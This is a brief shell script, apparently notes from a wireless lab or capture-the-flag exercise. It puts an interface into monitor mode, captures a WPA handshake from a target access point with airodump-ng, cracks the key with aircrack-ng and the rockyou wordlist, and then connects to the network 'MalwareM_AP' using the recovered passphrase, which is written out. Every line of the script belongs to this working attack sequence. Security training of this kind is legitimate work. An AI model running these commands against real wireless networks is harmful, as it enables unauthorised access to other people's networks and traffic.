```sh
iw dev
sudo iw dev wlan2 scan

# Init mode monitor
sudo ip link set dev wlan2 down
sudo iw dev wlan2 set type monitor
sudo ip link set dev wlan2 up
sudo iw dev wlan2 info

sudo airodump-ng wlan2
sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w rockyou.txt output-file-01.cap

wpa_passphrase MalwareM_AP 'fluffy/champ24' > config
sudo wpa_supplicant -B -c config -i wlan2
```
